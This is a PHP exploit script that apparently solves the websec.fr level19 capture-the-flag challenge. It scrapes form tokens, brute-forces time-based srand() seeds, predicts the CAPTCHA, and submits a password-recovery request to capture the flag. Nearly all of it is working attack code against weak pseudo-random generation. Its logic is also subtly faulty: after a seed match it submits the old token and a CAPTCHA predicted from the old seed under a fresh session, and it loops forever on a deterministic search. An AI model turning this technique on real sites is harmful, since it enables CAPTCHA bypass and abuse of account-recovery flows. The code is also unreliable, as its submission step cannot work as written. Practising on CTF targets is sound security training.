<?php
error_reporting(0);

echo "╔════════════════════════════════════════════════════════════╗\n";
echo "║    PATTERN ANALYSIS - Collecting token samples            ║\n";
echo "╚════════════════════════════════════════════════════════════╝\n\n";

$tokens = [];

echo "Collecting 100 token samples...\n\n";

for ($i = 1; $i <= 100; $i++) {
    $ch = curl_init("https://websec.fr/level19/index.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $start_time = time();
    $response = curl_exec($ch);
    $end_time = time();
    curl_close($ch);
    
    if (!$response) continue;
    
    $parts = explode("\r\n\r\n", $response, 2);
    $body = isset($parts[1]) ? $parts[1] : $response;
    
    if (preg_match('/name="token" value="([^"]+)"/', $body, $token_match)) {
        $token = $token_match[1];
        $tokens[] = [
            'token' => $token,
            'time' => $start_time,
            'sample' => $i
        ];
        
        echo "[$i] $token (time: $start_time)\n";
    }
    
    usleep(100000); // 100ms entre samples
}

echo "\n" . count($tokens) . " tokens collected\n\n";

// Análisis estadístico
echo "=== ANALYSIS ===\n\n";

// 1. Frecuencia de caracteres
$char_freq = [];
foreach ($tokens as $t) {
    for ($i = 0; $i < strlen($t['token']); $i++) {
        $char = $t['token'][$i];
        if (!isset($char_freq[$char])) {
            $char_freq[$char] = 0;
        }
        $char_freq[$char]++;
    }
}

arsort($char_freq);
echo "Character frequency (top 10):\n";
$count = 0;
foreach ($char_freq as $char => $freq) {
    echo "  '$char': $freq\n";
    if (++$count >= 10) break;
}

// 2. Buscar patrones temporales
echo "\n\nTemporal patterns:\n";
$time_groups = [];
foreach ($tokens as $t) {
    $time_key = $t['time'];
    if (!isset($time_groups[$time_key])) {
        $time_groups[$time_key] = [];
    }
    $time_groups[$time_key][] = $t['token'];
}

foreach ($time_groups as $time => $toks) {
    if (count($toks) > 1) {
        echo "  Time $time (" . date('H:i:s', $time) . ") has " . count($toks) . " tokens:\n";
        foreach ($toks as $tok) {
            echo "    " . substr($tok, 0, 16) . "...\n";
        }
        
        // ¿Son todos diferentes?
        $unique = array_unique($toks);
        if (count($unique) < count($toks)) {
            echo "    [!] Found duplicate tokens at same timestamp!\n";
        }
    }
}

// 3. Intentar predecir con los timestamps recolectados
echo "\n\nAttempting predictions with collected timestamps...\n";

function generate_random_text($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";

    $text = '';
    for($i = 0; $i < $length; $i++) {
        $text .= $chars[rand() % strlen($chars)];
    }
    return $text;
}

$found = false;
foreach ($tokens as $token_data) {
    $real_token = $token_data['token'];
    $timestamp = $token_data['time'];
    
    // Probar el timestamp exacto y cercanos
    for ($offset = -5; $offset <= 5; $offset++) {
        $seed = $timestamp + $offset;
        srand($seed);
        $test = generate_random_text(32);
        
        if ($test === $real_token) {
            echo "\n✓✓✓ FOUND MATCHING SEED! ✓✓✓\n";
            echo "Token: $real_token\n";
            echo "Seed: $seed\n";
            echo "Offset: $offset seconds from collection time\n";
            $found = true;
            break 2;
        }
    }
}

if (!$found) {
    echo "\nNo matches found with simple timestamp approach\n";
    echo "The PRNG implementation likely differs from standard\n";
}

echo "\n\nAnalysis complete. Continuing with infinite search...\n\n";

// Ahora intentar con cada token recolectado de forma exhaustiva
while (true) {
    echo "Starting exhaustive search on collected tokens...\n";
    
    foreach ($tokens as $idx => $token_data) {
        $real_token = $token_data['token'];
        $timestamp = $token_data['time'];
        $session_id = null;
        
        echo "  [" . ($idx + 1) . "/" . count($tokens) . "] Searching for: " . substr($real_token, 0, 12) . "...\n";
        
        // Buscar en un rango amplio
        $base_time = $timestamp;
        for ($offset = -7200; $offset <= 7200; $offset++) {
            $seed = $base_time + $offset;
            srand($seed);
            $test = generate_random_text(32);
            
            if ($test === $real_token) {
                echo "\n    ✓✓✓ MATCH! Seed: $seed ✓✓✓\n";
                
                // Obtener una sesión fresca
                $ch = curl_init("https://websec.fr/level19/index.php");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HEADER, true);
                $resp = curl_exec($ch);
                curl_close($ch);
                
                if ($resp && preg_match('/PHPSESSID=([a-z0-9]+)/i', $resp, $m)) {
                    $session_id = $m[1];
                    
                    srand($seed);
                    generate_random_text(32);
                    $captcha = generate_random_text(25);
                    
                    echo "    Predicted CAPTCHA: $captcha\n";
                    
                    $post_data = http_build_query([
                        'captcha' => $captcha,
                        'token' => $real_token,
                        'submit' => ''
                    ]);
                    
                    $ch = curl_init("https://websec.fr/level19/index.php");
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
                    curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=" . $session_id);
                    $result = curl_exec($ch);
                    curl_close($ch);
                    
                    if (strpos($result, 'Password recovery email sent') !== false) {
                        echo "\n    SUCCESS!\n";
                        if (preg_match('/WEBSEC\{[^}]+\}/', $result, $flag_match)) {
                            echo "    FLAG: " . $flag_match[0] . "\n";
                            file_put_contents('/workspace/websec_level19/FLAG.txt', $flag_match[0] . "\n");
                            exit(0);
                        }
                    }
                }
                break;
            }
        }
    }
    
    echo "Completed one full cycle, restarting...\n\n";
    sleep(1);
}
?>